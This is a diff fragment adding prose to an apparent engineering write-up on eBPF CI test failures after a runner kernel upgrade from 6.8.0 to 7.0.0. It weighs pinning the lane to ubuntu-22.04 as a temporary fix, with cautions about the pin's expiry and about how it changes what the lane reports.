+Not settled: **which kernel change.** 6.8.0 → 7.0.0 is a wide interval
+and this run narrows it no further. The live-window lead from runs 14
+and 15 survives intact and now has a control to be measured against:
+`openat_entered` spans 1..241 across the 17 failures here, and on 6.8
+there are no failures to span anything.
+
+### The stopgap this makes available
+
+Pinning the eBPF lane to `ubuntu-22.04` is now a measured option rather
+than a guess, and it would take `main` green on #1185. Two cautions
+belong with it.
+
+It is a pin to a release that will itself be retired, so it buys time
+rather than a fix, and it should carry a comment saying what measurement
+justified it and what the expiry is.
+
+And it would change what the lane reports, not only whether it passes.
+#1252's second onset coincides with the same image rollover (see the
+comment on that issue), so a 6.8 lane may surface the `do_filp_open`
+kprobe attach failure that #1313's guard has been aborting ahead of
+since 10-31 — or may not, if that defect is kernel-dependent too. Either
+outcome is information; neither should be read as a new regression.
